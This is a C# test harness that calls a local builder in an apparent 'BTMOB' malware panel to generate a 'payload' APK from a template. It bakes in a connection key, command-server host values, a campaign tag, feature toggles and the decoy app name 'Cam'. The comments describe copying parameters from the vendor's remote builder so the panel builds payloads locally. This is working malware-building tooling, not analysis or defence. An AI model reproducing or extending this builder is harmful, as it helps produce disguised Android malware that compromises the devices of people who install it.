// Standalone harness for LocalApkBuilder — builds a payload from template.apk
// with the same parameters the vendor builder used for the sample "test" APK.
// Compiled against the Btmob assembly to verify the local builder end-to-end
// without launching the full WinForms panel.

using System;
using System.Collections.Generic;
using System.IO;
using BTMOB;

internal static class Program
{
	private static int Main(string[] args)
	{
		string repoRoot = Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", ".."));
		string template = Path.Combine(repoRoot, "BTMOB", "template.apk");
		if (!File.Exists(template))
			template = Path.Combine(repoRoot, "template.apk");
		if (!File.Exists(template))
		{
			Console.WriteLine("template.apk not found near " + repoRoot);
			return 1;
		}

		// Same values the vendor's remote builder baked into test.apk:
		//   connkey = iza3a, hosts = www.google.com<insect.kingdom.brother, tag = test
		Dictionary<string, string> p = new Dictionary<string, string>
		{
			{ "subcom", "build" },
			{ "build", "test" },
			{ "conkey", "iza3a" },
			{ "uhost", "www.google.com<insect.kingdom.brother" },
			{ "Ctag", "test" },
			{ "allconf", "0|0[*]1|1[*]1|1[*]1|1[*]0|0[*]0|0[*]1|1[*]1|1[*]1|1[*]1|1[*]0|0[*]1|1[*]0|0[*]0|0[*]0|0[*]0|0|0|0[*]0|0[*]0|0[*]0|0[*]1|1" },
			{ "appname", "Cam" },
			{ "appversion", "1.0" },
			{ "appid", "insect.kingdom.brother" },
			{ "appurl", "https://example.com/app.apk" }
		};

		string outDir = Path.Combine(repoRoot, "BuiltApks");
		try
		{
			string apk = LocalApkBuilder.Build(p, template, outDir);
			Console.WriteLine("OK: " + apk);
			Console.WriteLine("size: " + new FileInfo(apk).Length);
			return 0;
		}
		catch (Exception ex)
		{
			Console.WriteLine("FAIL: " + ex.Message);
			Console.WriteLine(ex.ToString());
			return 2;
		}
	}
}
